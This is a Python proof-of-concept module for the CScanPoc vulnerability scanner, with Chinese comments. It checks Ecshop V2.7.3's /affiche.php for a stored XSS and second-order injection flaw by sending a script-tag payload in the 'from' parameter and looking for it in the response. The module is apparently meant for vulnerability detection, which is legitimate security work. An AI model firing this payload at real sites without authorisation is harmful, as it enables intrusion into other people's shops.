# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0015'  # 平台漏洞编号，留空
    name = 'Ecshop V2.7.3版本 XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2013-08-05'  # 漏洞公布时间
    desc = '''
        漏洞存在于站外广告统计功能(对应管理后台的报表统计->站外投放JS)，即/affiche.php页面，将from参数(网站来源referer)存储到了数据库表ecs_adsense，而在后台的“站外投放JS”读取出来未过滤又进入了sql语句，导致二次注入，同时，输出时未对字段referer过滤，导致存储XSS。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/676/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = 'V2.7.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0b7909e8-e5ad-4ba7-afea-0db87ca4ad03'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/affiche.php?from=a.baidu.com%3Cscript%3Ealert(c)%3C/script%3E&ad_id=-1"
            url = self.target + payload
            r = requests.get(url)

            if '<script>alert(c)</script>' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
